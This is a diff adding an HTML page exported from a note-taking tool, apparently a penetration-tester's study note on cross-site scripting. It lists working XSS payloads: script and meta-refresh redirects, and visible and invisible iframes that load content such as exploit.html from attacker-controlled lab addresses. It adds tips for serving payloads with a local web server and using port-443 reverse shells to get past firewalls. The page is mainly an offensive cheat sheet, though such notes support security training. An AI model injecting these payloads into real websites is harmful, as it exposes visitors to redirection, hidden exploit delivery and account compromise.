@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XSS</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># XSS / Cross-Site Scripting</h1></strong><br />An XSS vulnerability enables an attacker to inject client-side scripts into web pages viewed by other users.<br /><br /><strong><h2>## Payloads</h2></strong><br />Total redirect<br /><code>&lt;script&gt;document.location=&#39;http://10.11.0.184:8080/&#39;&lt;/script&gt;</code><br /><br />A hard redirect (refer to User Exploitation sub-node)<br /><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5; url=http://10.11.0.184:8080/blah&quot;/&gt;</code><br /><br />Insert an iframe<br /><code>&lt;iframe src=&quot;http://10.11.0.184:8000/exploit.html&quot;&gt;&lt;/iframe&gt;</code><br /><br />Insert an invisible iframe<br /><code>&lt;iframe src=&quot;http://10.11.0.5/report&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</code><br /><br /><strong><h2>## Troubleshooting XSS Attacks</h2></strong><br />• Try client-side-exploits locally first to verify that it works -&gt; then progress to the target<br />• Try serving via python - <code>python3 -m http.server</code> (can see web requests easily)<br />• Try servicing via Apache - <code>service apache2 start</code> (might work more reliably with Apache for some reason)<br />• Try using a <code>443</code> reverse shell, which should bypass firewalls (if any)<br />   ◇ bind shells behind firewalls won&#39;t because they won&#39;t allow inbound connections<br />   ◇ reverse shells because all outbound traffic is pretty much allowed<br />• Sometimes the payload delivery can be the problem<br />   ◇ Try mimicking the payload delivery in your test machine first<br />   ◇ Or just try different methods (like below + google)<br />• Don&#39;t copy/paste from exploit-db, download instead<br />   ◇ sometimes exploits can have funny line-endings which can mess the whole exploit up<br /><br /></div>
+</body>
+</html>
